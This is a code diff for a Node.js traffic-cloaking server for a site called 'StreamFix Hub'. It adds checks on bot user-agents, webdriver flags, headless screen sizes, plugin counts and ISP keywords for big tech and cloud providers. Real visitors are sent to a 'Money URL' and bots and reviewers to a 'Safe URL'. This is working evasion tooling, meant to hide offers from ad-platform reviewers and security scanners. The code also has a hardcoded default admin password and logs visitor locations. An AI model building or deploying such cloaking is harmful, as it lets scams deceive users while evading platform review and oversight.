@@ -35,7 +35,6 @@ function appendLog(entry) {
 }
 
 // ─── Admin password ───────────────────────────────────────────────────────────
-// Set ADMIN_PASSWORD env var to your desired password. Default: admin123
 var ADMIN_PASSWORD_PLAIN = process.env.ADMIN_PASSWORD || 'admin123';
 var ADMIN_PASSWORD_HASH = bcrypt.hashSync(ADMIN_PASSWORD_PLAIN, 10);
 
@@ -57,17 +56,27 @@ function isBot(ua) {
   return BOT_PATTERNS.some(function(p) { return p.test(ua); });
 }
 
+// ─── Suspicious ISP/org keywords ─────────────────────────────────────────────
+var SUSPICIOUS_ISP = [
+  'google', 'amazon', 'microsoft', 'cloudflare', 'digitalocean',
+  'linode', 'vultr', 'ovh', 'hetzner', 'facebook', 'apple'
+];
+
+function isSuspiciousISP(isp, org) {
+  var combined = ((isp || '') + ' ' + (org || '')).toLowerCase();
+  return SUSPICIOUS_ISP.some(function(k) { return combined.indexOf(k) !== -1; });
+}
+
 // ─── IP reputation check via ip-api.com ──────────────────────────────────────
 function checkIP(ip) {
   return new Promise(function(resolve) {
-    // Skip private/loopback IPs
     if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('10.') ||
         ip.startsWith('192.168.') || ip.startsWith('172.')) {
-      return resolve({ proxy: false, hosting: false, country: 'XX', isp: 'local' });
+      return resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: 'local', org: '' });
     }
     var opts = {
       hostname: 'ip-api.com',
-      path: '/json/' + ip + '?fields=status,country,countryCode,isp,org,proxy,hosting',
+      path: '/json/' + ip + '?fields=status,country,countryCode,city,regionName,isp,org,proxy,hosting',
       method: 'GET',
       headers: { 'User-Agent': 'node-cloaker/1.0' }
     };
@@ -77,19 +86,21 @@ function checkIP(ip) {
       res.on('data', function(c) { data += c; });
       res.on('end', function() {
         try {
-          var parsed = JSON.parse(data);
+          var p = JSON.parse(data);
           resolve({
-            proxy: parsed.proxy || false,
-            hosting: parsed.hosting || false,
-            country: parsed.countryCode || 'XX',
-            isp: parsed.isp || '',
-            org: parsed.org || ''
+            proxy: p.proxy || false,
+            hosting: p.hosting || false,
+            country: p.countryCode || 'XX',
+            city: p.city || '',
+            regionName: p.regionName || '',
+            isp: p.isp || '',
+            org: p.org || ''
           });
-        } catch (e) { resolve({ proxy: false, hosting: false, country: 'XX', isp: '' }); }
+        } catch (e) { resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); }
       });
     });
-    req.on('error', function() { resolve({ proxy: false, hosting: false, country: 'XX', isp: '' }); });
-    req.setTimeout(4000, function() { req.destroy(); resolve({ proxy: false, hosting: false, country: 'XX', isp: '' }); });
+    req.on('error', function() { resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); });
+    req.setTimeout(4000, function() { req.destroy(); resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); });
     req.end();
   });
 }
@@ -140,68 +151,88 @@ app.post('/api/cloak', async function(req, res) {
   var sh = parseInt(req.body.sh) || 0;
   var wd = req.body.wd === true || req.body.wd === 'true';
   var pl = parseInt(req.body.pl) || 0;
+  var screenStr = sw + 'x' + sh;
 
   var moneyUrl = settings.moneyUrl || '/offer';
-  var safeUrl = settings.safeUrl || '/safe';
+  var safeUrl  = settings.safeUrl  || '/safe';
 
-  // If cloaking is disabled, always allow
-  if (!settings.enabled) {
+  function fastBlock(reason) {
     var entry = {
-      ts: new Date().toISOString(), ip: realIP, country: 'XX',
-      ua: ua.slice(0, 80), decision: 'allow', reason: 'disabled'
+      ts: new Date().toISOString(), ip: realIP,
+      country: 'XX', city: '', region: '', isp: '',
+      ua: ua.slice(0, 80), screen: screenStr, plugins: pl,
+      decision: 'block', reason: reason
     };
     appendLog(entry);
+    return res.json({ decision: 'block', url: safeUrl });
+  }
+
+  // Cloaking disabled → always allow
+  if (!settings.enabled) {
+    appendLog({
+      ts: new Date().toISOString(), ip: realIP,
+      country: 'XX', city: '', region: '', isp: '',
+      ua: ua.slice(0, 80), screen: screenStr, plugins: pl,
+      decision: 'allow', reason: 'disabled'
+    });
     return res.json({ decision: 'allow', url: moneyUrl });
   }
 
-  // Check UA for bots
-  if (isBot(ua)) {
-    var entry = {
-      ts: new Date().toISOString(), ip: realIP, country: 'XX',
-      ua: ua.slice(0, 80), decision: 'block', reason: 'bot-ua'
-    };
-    appendLog(entry);
-    return res.json({ decision: 'block', url: safeUrl });
+  // 1. Bot User-Agent check
+  if (isBot(ua)) return fastBlock('bot-ua');
+
+  // 2. Webdriver flag
+  if (wd) return fastBlock('webdriver');
+
+  // 3. Screen size checks
+  if (sw === 0 || sh === 0) return fastBlock('no-screen');
+  if ((sw === 800 && sh === 600) || (sw === 1024 && sh === 768)) {
+    if (pl === 0) return fastBlock('headless-screen');
   }
 
-  // webdriver flag
-  if (wd) {
-    var entry = {
-      ts: new Date().toISOString(), ip: realIP, country: 'XX',
-      ua: ua.slice(0, 80), decision: 'block', reason: 'webdriver'
-    };
-    appendLog(entry);
-    return res.json({ decision: 'block', url: safeUrl });
-  }
+  // 4. Plugin count + desktop UA check
+  var isMobile = /iPhone|Android|iPad|Mobile/i.test(ua);
+  var isDesktop = /Windows|Macintosh/i.test(ua);
+  if (!isMobile && isDesktop && pl === 0) return fastBlock('no-plugins-desktop');
 
-  // IP reputation check
+  // 5. IP reputation check (includes city/region/ISP)
   var ipData;
   try { ipData = await checkIP(realIP); } catch (e) {
-    ipData = { proxy: false, hosting: false, country: 'XX', isp: '' };
+    ipData = { proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' };
   }
 
   var decision = 'allow';
-  var reason = 'clean';
+  var reason   = 'clean';
 
-  if (ipData.proxy || ipData.hosting) {
+  // 6. Suspicious ISP/org check
+  if (isSuspiciousISP(ipData.isp, ipData.org)) {
     decision = 'block';
-    reason = ipData.proxy ? 'proxy-vpn' : 'datacenter';
+    reason   = 'suspicious-isp';
+  }
+  // 7. Proxy / hosting check
+  else if (ipData.proxy || ipData.hosting) {
+    decision = 'block';
+    reason   = ipData.proxy ? 'proxy-vpn' : 'datacenter';
   }
 
-  var entry = {
+  appendLog({
     ts: new Date().toISOString(),
     ip: realIP,
     country: ipData.country || 'XX',
+    city: ipData.city || '',
+    region: ipData.regionName || '',
+    isp: ipData.isp || '',
     ua: ua.slice(0, 80),
+    screen: screenStr,
+    plugins: pl,
     decision: decision,
     reason: reason
-  };
-  appendLog(entry);
+  });
 
   res.json({ decision: decision, url: decision === 'allow' ? moneyUrl : safeUrl });
 });
 
-// ─── Legacy proxy (kept for backward compat, now self-hosted) ─────────────────
+// ─── Legacy redirect ───────────────────────────────────────────────────────────
 app.post('/api/cloakify', function(req, res) {
   res.redirect(307, '/api/cloak');
 });
@@ -231,22 +262,14 @@ app.get('/admin/logout', function(req, res) {
 app.get('/admin', requireAdmin, function(req, res) {
   var settings = readSettings();
   var logs = readLogs();
-
-  var today = new Date().toISOString().slice(0, 10);
-  var todayLogs = logs.filter(function(l) { return l.ts && l.ts.startsWith(today); });
-  var allowCount = todayLogs.filter(function(l) { return l.decision === 'allow'; }).length;
-  var blockCount = todayLogs.filter(function(l) { return l.decision === 'block'; }).length;
-
-  var recentLogs = logs.slice(0, 100);
-
-  res.send(adminDashboardPage(settings, allowCount, blockCount, recentLogs));
+  res.send(adminDashboardPage(settings, logs));
 });
 
 // ─── Admin settings save ──────────────────────────────────────────────────────
 app.post('/admin/settings', requireAdmin, function(req, res) {
   var settings = readSettings();
   settings.moneyUrl = (req.body.moneyUrl || '').trim();
-  settings.safeUrl = (req.body.safeUrl || '/safe').trim();
+  settings.safeUrl  = (req.body.safeUrl  || '/safe').trim();
   writeSettings(settings);
   res.redirect('/admin');
 });
@@ -256,6 +279,12 @@ app.post('/admin/toggle', requireAdmin, function(req, res) {
   var settings = readSettings();
   settings.enabled = !settings.enabled;
   writeSettings(settings);
+  res.redirect('/admin');
+});
+
+// ─── Admin clear logs ─────────────────────────────────────────────────────────
+app.post('/admin/clear-logs', requireAdmin, function(req, res) {
+  fs.writeFileSync(LOGS_FILE, '[]');
   res.redirect('/admin');
 });
 
@@ -297,7 +326,7 @@ button:hover{background:#6d28d9}
 <body>
 <div class="card">
   <h1>Admin Panel</h1>
-  <p class="sub">Digital Streaming Services &mdash; Cloaking Control</p>
+  <p class="sub">StreamFix Hub &mdash; Cloaking Control</p>
   <form method="POST" action="/admin/login">
     <label for="password">Password</label>
     <input type="password" id="password" name="password" autofocus autocomplete="current-password" placeholder="Enter admin password">
@@ -309,16 +338,88 @@ button:hover{background:#6d28d9}
 </html>`;
 }
 
-function adminDashboardPage(settings, allowCount, blockCount, logs) {
-  var toggleLabel = settings.enabled ? 'Disable Cloaking' : 'Enable Cloaking';
-  var statusBadge = settings.enabled
-    ? '<span class="badge on">ENABLED</span>'
+function adminDashboardPage(settings, logs) {
+  var now = new Date();
+  var today = now.toISOString().slice(0, 10);
+  var timeStr = now.toUTCString().slice(17, 25);
+
+  // ── Stats ─────────────────────────────────────────────────────────────────
+  var todayLogs    = logs.filter(function(l) { return l.ts && l.ts.startsWith(today); });
+  var todayAllow   = todayLogs.filter(function(l) { return l.decision === 'allow'; }).length;
+  var todayBlock   = todayLogs.filter(function(l) { return l.decision === 'block'; }).length;
+  var todayTotal   = todayAllow + todayBlock;
+  var allAllow     = logs.filter(function(l) { return l.decision === 'allow'; }).length;
+  var allBlock     = logs.filter(function(l) { return l.decision === 'block'; }).length;
+  var allTotal     = allAllow + allBlock;
+  var blockRate    = allTotal > 0 ? Math.round(allBlock / allTotal * 100) : 0;
+
+  // ── Top countries ─────────────────────────────────────────────────────────
+  var countryCounts = {};
+  logs.forEach(function(l) {
+    var cc = l.country || 'XX';
+    countryCounts[cc] = (countryCounts[cc] || 0) + 1;
+  });
+  var flags = { US:'🇺🇸',GB:'🇬🇧',CA:'🇨🇦',AU:'🇦🇺',IN:'🇮🇳',DE:'🇩🇪',FR:'🇫🇷',PH:'🇵🇭',MX:'🇲🇽',BR:'🇧🇷',NL:'🇳🇱',SG:'🇸🇬',JP:'🇯🇵',NG:'🇳🇬',PK:'🇵🇰',ZA:'🇿🇦',XX:'🌐' };
+  var topCountries = Object.keys(countryCounts)
+    .sort(function(a,b){ return countryCounts[b]-countryCounts[a]; })
+    .slice(0, 6);
+  var maxCC = topCountries.length > 0 ? countryCounts[topCountries[0]] : 1;
+  var countryRows = topCountries.map(function(cc) {
+    var cnt = countryCounts[cc];
+    var pct = Math.round(cnt / maxCC * 100);
+    var flag = flags[cc] || '🌐';
+    return '<div class="cc-row"><span class="cc-flag">' + flag + '</span><span class="cc-code">' + escHtml(cc) + '</span><div class="cc-bar-wrap"><div class="cc-bar" style="width:' + pct + '%"></div></div><span class="cc-cnt">' + cnt + '</span></div>';
+  }).join('') || '<p class="empty">No data yet</p>';
+
+  // ── Block reasons ─────────────────────────────────────────────────────────
+  var reasonCounts = {};
+  logs.filter(function(l){ return l.decision === 'block'; }).forEach(function(l) {
+    var r = l.reason || 'unknown';
+    reasonCounts[r] = (reasonCounts[r] || 0) + 1;
+  });
+  var reasonOrder = ['bot-ua','datacenter','proxy-vpn','suspicious-isp','webdriver','no-screen','headless-screen','no-plugins-desktop'];
+  var reasonColors = { 'bot-ua':'amber','webdriver':'amber','no-screen':'amber','headless-screen':'amber','no-plugins-desktop':'amber','datacenter':'red','proxy-vpn':'red','suspicious-isp':'red' };
+  var reasonPills = reasonOrder.filter(function(r){ return reasonCounts[r] > 0; }).map(function(r) {
+    var col = reasonColors[r] || 'grey';
+    return '<span class="pill pill-' + col + '">' + escHtml(r) + ' <strong>' + reasonCounts[r] + '</strong></span>';
+  }).join('') || '<span class="empty">No blocks yet</span>';
+
+  // ── Toggle ────────────────────────────────────────────────────────────────
+  var toggleLabel  = settings.enabled ? 'Disable Cloaking' : 'Enable Cloaking';
+  var pulseDot     = settings.enabled ? '<span class="pulse-dot"></span>' : '';
+  var statusBadge  = settings.enabled
+    ? pulseDot + '<span class="badge on">ENABLED</span>'
     : '<span class="badge off">DISABLED</span>';
 
-  var logRows = logs.map(function(l) {
-    var cls = l.decision === 'allow' ? 'allow' : 'block';
-    var ts = l.ts ? l.ts.replace('T', ' ').slice(0, 19) : '';
-    return '<tr><td>' + ts + '</td><td>' + escHtml(l.ip || '') + '</td><td>' + escHtml(l.country || '') + '</td><td class="ua">' + escHtml((l.ua || '').slice(0, 60)) + '</td><td class="' + cls + '">' + escHtml(l.decision || '') + '</td><td>' + escHtml(l.reason || '') + '</td></tr>';
+  // ── Log rows ──────────────────────────────────────────────────────────────
+  function locationStr(l) {
+    var parts = [];
+    if (l.city)   parts.push(escHtml(l.city));
+    if (l.region) parts.push(escHtml(l.region));
+    parts.push(escHtml(l.country || 'XX'));
+    return parts.join(', ');
+  }
+  function reasonPill(r) {
+    var col = { clean:'green', 'bot-ua':'amber', webdriver:'amber', 'no-screen':'amber', 'headless-screen':'amber', 'no-plugins-desktop':'amber', datacenter:'red', 'proxy-vpn':'red', 'suspicious-isp':'red', disabled:'grey' }[r] || 'grey';
+    return '<span class="rpill rpill-' + col + '">' + escHtml(r || '') + '</span>';
+  }
+  var logRows = logs.slice(0, 150).map(function(l) {
+    var cls     = l.decision === 'allow' ? 'allow' : 'block';
+    var ts      = l.ts ? l.ts.replace('T',' ').slice(0,19) : '';
+    var isp     = (l.isp || '').slice(0, 22);
+    var screen  = (!l.screen || l.screen === '0x0') ? '—' : escHtml(l.screen);
+    var plugins = (l.plugins !== undefined && l.plugins !== null) ? l.plugins : '—';
+    return '<tr>'
+      + '<td class="mono">' + ts + '</td>'
+      + '<td class="mono">' + escHtml(l.ip || '') + '</td>'
+      + '<td>' + locationStr(l) + '</td>'
+      + '<td class="isp" title="' + escHtml(l.isp || '') + '">' + escHtml(isp) + '</td>'
+      + '<td class="mono">' + screen + '</td>'
+      + '<td>' + plugins + '</td>'
+      + '<td class="ua">' + escHtml((l.ua || '').slice(0, 50)) + '</td>'
+      + '<td class="' + cls + '">' + escHtml(l.decision || '') + '</td>'
+      + '<td>' + reasonPill(l.reason) + '</td>'
+      + '</tr>';
   }).join('');
 
   return `<!DOCTYPE html>
@@ -326,65 +427,128 @@ function adminDashboardPage(settings, allowCount, blockCount, logs) {
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Admin Dashboard</title>
+<meta http-equiv="refresh" content="60">
+<title>Cloaking Admin — StreamFix Hub</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d0010;color:#e0e0e0;min-height:100vh}
-header{background:#1a0d2e;border-bottom:1px solid #3d1f6e;padding:16px 28px;display:flex;justify-content:space-between;align-items:center}
-header h1{font-size:1.1rem;color:#c084fc;font-weight:700}
-header a{color:#888;font-size:0.82rem;text-decoration:none}
-header a:hover{color:#c084fc}
-.container{max-width:1100px;margin:0 auto;padding:28px 20px}
-.grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:24px}
-@media(max-width:700px){.grid{grid-template-columns:1fr}}
-.card{background:#1a0d2e;border:1px solid #3d1f6e;border-radius:12px;padding:24px}
-.card h2{font-size:0.9rem;text-transform:uppercase;letter-spacing:1px;color:#a78bfa;margin-bottom:18px}
-.badge{display:inline-block;padding:4px 12px;border-radius:20px;font-size:0.78rem;font-weight:700;letter-spacing:0.5px}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#08050f;color:#e0e0e0;min-height:100vh}
+
+header{background:#120824;border-bottom:1px solid #2e1655;padding:14px 28px;display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:10px}
+.hdr-left h1{font-size:1.05rem;color:#c084fc;font-weight:700;margin-bottom:4px}
+.hdr-urls{font-size:0.74rem;color:#6b6b8a}
+.hdr-urls span{color:#a78bfa}
+.hdr-right{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.hdr-time{font-size:0.75rem;color:#555;white-space:nowrap}
+.hdr-right a{color:#888;font-size:0.8rem;text-decoration:none}
+.hdr-right a:hover{color:#c084fc}
+
+.container{max-width:1260px;margin:0 auto;padding:24px 18px}
+
+/* ── Grid layouts ── */
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-bottom:18px}
+.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:18px;margin-bottom:18px}
+.full{grid-column:1/-1}
+@media(max-width:900px){.grid2,.grid3{grid-template-columns:1fr}}
+
+/* ── Card ── */
+.card{background:#1a0d2e;border:1px solid #2e1655;border-radius:12px;padding:22px}
+.card h2{font-size:0.78rem;text-transform:uppercase;letter-spacing:1.2px;color:#a78bfa;margin-bottom:16px;font-weight:700}
+
+/* ── Badge / status ── */
+.badge{display:inline-block;padding:3px 12px;border-radius:20px;font-size:0.75rem;font-weight:700;letter-spacing:0.5px;vertical-align:middle}
 .badge.on{background:#14532d;color:#4ade80}
 .badge.off{background:#450a0a;color:#f87171}
-.toggle-status{display:flex;align-items:center;gap:14px;margin-bottom:16px}
-.toggle-status p{font-size:0.85rem;color:#888}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.25}}
+.pulse-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#4ade80;animation:pulse 1.5s infinite;margin-right:7px;vertical-align:middle}
+
+/* ── Toggle section ── */
+.toggle-row{display:flex;align-items:center;gap:14px;margin-bottom:14px;flex-wrap:wrap}
+.toggle-row p{font-size:0.82rem;color:#777}
 form.inline{display:inline}
-button{padding:10px 20px;border:none;border-radius:8px;font-size:0.88rem;font-weight:600;cursor:pointer;transition:background .2s}
-.btn-primary{background:#7c3aed;color:#fff}
-.btn-primary:hover{background:#6d28d9}
-.btn-danger{background:#7f1d1d;color:#fca5a5}
-.btn-danger:hover{background:#991b1b}
-.btn-success{background:#14532d;color:#4ade80}
-.btn-success:hover{background:#166534}
-label{display:block;font-size:0.8rem;color:#aaa;margin-bottom:5px;margin-top:12px}
-input[type=text],input[type=url]{width:100%;padding:9px 12px;background:#0d0010;border:1px solid #3d1f6e;border-radius:8px;color:#e0e0e0;font-size:0.88rem;outline:none}
-input[type=text]:focus,input[type=url]:focus{border-color:#a855f7}
-.stats{display:flex;gap:16px;flex-wrap:wrap}
-.stat{flex:1;min-width:110px;background:#0d0010;border-radius:10px;padding:16px;text-align:center;border:1px solid #3d1f6e}
-.stat .num{font-size:2rem;font-weight:700;display:block}
-.stat .lbl{font-size:0.75rem;color:#888;margin-top:4px}
-.allow-num{color:#4ade80}
-.block-num{color:#f87171}
-.log-wrap{overflow-x:auto}
-table{width:100%;border-collapse:collapse;font-size:0.8rem}
-th{text-align:left;padding:8px 10px;color:#a78bfa;border-bottom:1px solid #3d1f6e;font-weight:600;white-space:nowrap}
-td{padding:7px 10px;border-bottom:1px solid #1e1035;color:#ccc}
-td.ua{max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#888}
-td.allow{color:#4ade80;font-weight:600}
-td.block{color:#f87171;font-weight:600}
-tr:hover td{background:rgba(124,58,237,0.06)}
-.full-width{grid-column:1/-1}
+button{padding:9px 18px;border:none;border-radius:8px;font-size:0.85rem;font-weight:600;cursor:pointer;transition:background .2s}
+.btn-primary{background:#7c3aed;color:#fff}.btn-primary:hover{background:#6d28d9}
+.btn-danger{background:#7f1d1d;color:#fca5a5}.btn-danger:hover{background:#991b1b}
+.btn-success{background:#14532d;color:#4ade80}.btn-success:hover{background:#166534}
+.btn-sm{padding:6px 13px;font-size:0.78rem}
+
+/* ── Stats ── */
+.stats-row{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:10px}
+.stat{flex:1;min-width:90px;background:#0d0018;border:1px solid #2e1655;border-radius:10px;padding:14px 10px;text-align:center}
+.stat .num{font-size:1.7rem;font-weight:800;display:block;line-height:1}
+.stat .lbl{font-size:0.7rem;color:#666;margin-top:5px;display:block}
+.allow-num{color:#4ade80}.block-num{color:#f87171}.total-num{color:#a78bfa}.rate-num{color:#fb923c}
+
+/* ── Country bars ── */
+.cc-row{display:flex;align-items:center;gap:8px;margin-bottom:9px}
+.cc-flag{font-size:1.1rem;width:22px;text-align:center}
+.cc-code{font-size:0.78rem;font-weight:700;color:#c084fc;width:26px}
+.cc-bar-wrap{flex:1;background:#0d0018;border-radius:4px;height:8px;overflow:hidden}
+.cc-bar{height:100%;background:linear-gradient(90deg,#7c3aed,#a855f7);border-radius:4px;transition:width .4s}
+.cc-cnt{font-size:0.78rem;color:#888;width:30px;text-align:right}
+
+/* ── Reason pills (summary) ── */
+.pills-wrap{display:flex;flex-wrap:wrap;gap:8px}
+.pill{display:inline-flex;align-items:center;gap:5px;padding:5px 12px;border-radius:20px;font-size:0.78rem}
+.pill strong{font-size:0.88rem}
+.pill-amber{background:#451a03;color:#fbbf24}
+.pill-red{background:#450a0a;color:#f87171}
+.pill-grey{background:#1c1c2e;color:#888}
+
+/* ── URL settings ── */
+label{display:block;font-size:0.78rem;color:#aaa;margin-bottom:5px;margin-top:14px}
+input[type=text],input[type=url]{width:100%;padding:9px 12px;background:#0d0018;border:1px solid #2e1655;border-radius:8px;color:#e0e0e0;font-size:0.85rem;outline:none}
+input:focus{border-color:#a855f7}
+
+/* ── Log table ── */
+.log-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
+table{width:100%;border-collapse:collapse;font-size:0.76rem}
+th{text-align:left;padding:8px 10px;color:#a78bfa;border-bottom:1px solid #2e1655;font-weight:600;white-space:nowrap;background:#120824;position:sticky;top:0}
+td{padding:6px 10px;border-bottom:1px solid #160928;color:#ccc;white-space:nowrap}
+td.mono{font-family:'SF Mono',Menlo,monospace;font-size:0.72rem;color:#888}
+td.ua{max-width:180px;overflow:hidden;text-overflow:ellipsis;color:#777}
+td.isp{max-width:140px;overflow:hidden;text-overflow:ellipsis;color:#9ca3af}
+td.allow{color:#4ade80;font-weight:700}
+td.block{color:#f87171;font-weight:700}
+tr:hover td{background:rgba(124,58,237,0.07)}
+
+/* ── Reason pills (table) ── */
+.rpill{display:inline-block;padding:2px 9px;border-radius:12px;font-size:0.7rem;font-weight:600}
+.rpill-green{background:#14532d;color:#4ade80}
+.rpill-amber{background:#451a03;color:#fbbf24}
+.rpill-red{background:#450a0a;color:#f87171}
+.rpill-grey{background:#1c1c2e;color:#888}
+
+.empty{font-size:0.82rem;color:#444;font-style:italic}
 </style>
 </head>
 <body>
+
 <header>
-  <h1>&#9680; Cloaking Admin</h1>
-  <a href="/admin/logout">Sign out</a>
+  <div class="hdr-left">
+    <h1>&#9680; StreamFix Hub — Cloaking Admin</h1>
+    <div class="hdr-urls">
+      Money URL: <span>${escHtml(settings.moneyUrl || '—')}</span>
+      &nbsp;&nbsp;|&nbsp;&nbsp;
+      Safe URL: <span>${escHtml(settings.safeUrl || '—')}</span>
+    </div>
+  </div>
+  <div class="hdr-right">
+    <span class="hdr-time">Last updated: ${timeStr} UTC</span>
+    <form method="POST" action="/admin/clear-logs" class="inline" onsubmit="return confirm('Clear all logs?')">
+      <button type="submit" class="btn-danger btn-sm">Clear Logs</button>
+    </form>
+    <a href="/admin/logout">Sign out</a>
+  </div>
 </header>
+
 <div class="container">
 
-  <div class="grid">
+  <!-- Row 1: Engine + Stats -->
+  <div class="grid2">
 
-    <!-- Cloaking Toggle -->
     <div class="card">
       <h2>Cloaking Engine</h2>
-      <div class="toggle-status">
+      <div class="toggle-row">
         ${statusBadge}
         <p>Traffic filtering is ${settings.enabled ? 'active' : 'inactive'}</p>
       </div>
@@ -393,25 +557,43 @@ tr:hover td{background:rgba(124,58,237,0.06)}
       </form>
     </div>
 
-    <!-- Stats bar -->
     <div class="card">
-      <h2>Today's Stats</h2>
-      <div class="stats">
-        <div class="stat"><span class="num allow-num">${allowCount}</span><span class="lbl">Allowed</span></div>
-        <div class="stat"><span class="num block-num">${blockCount}</span><span class="lbl">Blocked</span></div>
-        <div class="stat"><span class="num" style="color:#a78bfa">${allowCount + blockCount}</span><span class="lbl">Total</span></div>
+      <h2>Traffic Stats</h2>
+      <div class="stats-row">
+        <div class="stat"><span class="num allow-num">${todayAllow}</span><span class="lbl">Today Allowed</span></div>
+        <div class="stat"><span class="num block-num">${todayBlock}</span><span class="lbl">Today Blocked</span></div>
+        <div class="stat"><span class="num total-num">${todayTotal}</span><span class="lbl">Today Total</span></div>
+      </div>
+      <div class="stats-row">
+        <div class="stat"><span class="num allow-num" style="font-size:1.3rem">${allAllow}</span><span class="lbl">All-time Allowed</span></div>
+        <div class="stat"><span class="num block-num" style="font-size:1.3rem">${allBlock}</span><span class="lbl">All-time Blocked</span></div>
+        <div class="stat"><span class="num rate-num" style="font-size:1.3rem">${blockRate}%</span><span class="lbl">Block Rate</span></div>
       </div>
     </div>
 
-    <!-- URL Settings -->
-    <div class="card full-width">
+  </div>
+
+  <!-- Row 2: Top Countries + Block Reasons + URL Settings -->
+  <div class="grid3">
+
+    <div class="card">
+      <h2>Top Countries</h2>
+      ${countryRows}
+    </div>
+
+    <div class="card">
+      <h2>Block Reasons</h2>
+      <div class="pills-wrap">${reasonPills}</div>
+    </div>
+
+    <div class="card">
       <h2>URL Settings</h2>
       <form method="POST" action="/admin/settings">
-        <label for="moneyUrl">Money URL (shown to real users)</label>
+        <label for="moneyUrl">Money URL — real visitors see this</label>
         <input type="text" id="moneyUrl" name="moneyUrl" value="${escHtml(settings.moneyUrl || '')}" placeholder="https://your-offer-url.com">
-        <label for="safeUrl">Safe URL (shown to bots / reviewers)</label>
+        <label for="safeUrl">Safe URL — bots &amp; reviewers see this</label>
         <input type="text" id="safeUrl" name="safeUrl" value="${escHtml(settings.safeUrl || '/safe')}" placeholder="/safe">
-        <button type="submit" class="btn-primary" style="margin-top:18px">Save URLs</button>
+        <button type="submit" class="btn-primary" style="margin-top:16px;width:100%">Save URLs</button>
       </form>
     </div>
 
@@ -419,14 +601,24 @@ tr:hover td{background:rgba(124,58,237,0.06)}
 
   <!-- Decision Log -->
   <div class="card">
-    <h2>Decision Log &mdash; Last ${Math.min(logs.length, 100)} entries</h2>
+    <h2>Decision Log — Last ${Math.min(logs.length, 150)} entries (auto-refreshes every 60s)</h2>
     <div class="log-wrap">
       <table>
         <thead>
-          <tr><th>Timestamp</th><th>IP</th><th>Country</th><th>User Agent</th><th>Decision</th><th>Reason</th></tr>
+          <tr>
+            <th>Time</th>
+            <th>IP</th>
+            <th>Location</th>
+            <th>ISP</th>
+            <th>Screen</th>
+            <th>Plugins</th>
+            <th>User Agent</th>
+            <th>Decision</th>
+            <th>Reason</th>
+          </tr>
         </thead>
         <tbody>
-          ${logRows || '<tr><td colspan="6" style="text-align:center;color:#555;padding:20px">No entries yet</td></tr>'}
+          ${logRows || '<tr><td colspan="9" style="text-align:center;color:#444;padding:24px">No entries yet</td></tr>'}
         </tbody>
       </table>
     </div>
